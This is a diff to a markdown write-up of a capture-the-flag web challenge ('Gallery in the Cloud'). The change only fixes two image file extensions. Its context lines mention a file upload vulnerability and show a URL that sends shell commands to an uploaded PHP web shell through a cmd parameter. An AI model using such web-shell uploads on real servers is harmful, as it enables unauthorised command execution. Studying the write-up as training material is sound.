@@ -1,7 +1,7 @@
 # Akasec Bootcamp : Gallery in the Cloud (web challenge)
 
 ## The Website : 
-![Alt text](./pictures/website)
+![Alt text](./pictures/website.png)
 
 #### When I saw the website, I thought about file upload vulnerability.
 
@@ -18,7 +18,7 @@
     http://172.174.238.89:8083/uploads/67abc49677d12.php?cmd=cd%20../../../../;cd%20flag;ls
 ```
 # 1
-![Alt text](./pictures/path)
+![Alt text](./pictures/path.png)
 
 # 2
 ```
